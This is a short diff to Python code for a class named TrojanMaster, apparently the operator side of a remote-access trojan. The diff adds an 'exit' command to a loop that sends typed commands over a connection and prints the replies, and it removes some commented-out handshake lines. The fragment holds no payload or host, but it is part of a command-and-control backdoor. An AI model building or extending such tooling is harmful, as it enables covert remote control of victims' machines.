@@ -32,16 +32,16 @@ class TrojanMaster(threading.Thread):
             command = input(">>> ")
             if command == "":
                 print("Enter command string")
+            elif command == "exit":
+                self.send_message(command)
+                self.close()
             else:
                 self.send_message(command)
                 print(self.receive_message())
 
 
     def run(self):
-        #self.send_message("Client Successfully Connected.\n")
         self.trojan_logic()
-        #self.send_message("--c")
-        #self.receive_message()
 
     def close(self):
         self.connection.close()
